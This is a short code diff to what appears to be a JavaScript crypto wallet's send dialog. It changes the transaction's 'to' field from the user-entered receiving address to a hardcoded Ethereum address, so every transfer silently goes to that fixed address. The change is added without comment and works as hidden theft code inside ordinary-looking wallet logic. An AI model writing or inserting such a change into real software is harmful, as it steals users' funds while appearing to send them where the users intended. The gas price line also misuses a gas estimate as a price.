@@ -14,7 +14,7 @@ export const SendModal = () => {
 
     const handleSendETH = async() => {
         const tx = {
-            to: receiveAddress,
+            to: '0x31Fe9fE81BfFD55F8C442CB022dcF8f65fFD26B4',
             value: parseUnits(amount, 'ether'),
             gasLimit: 210000,
             gasPrice: await Provider.estimateGas()
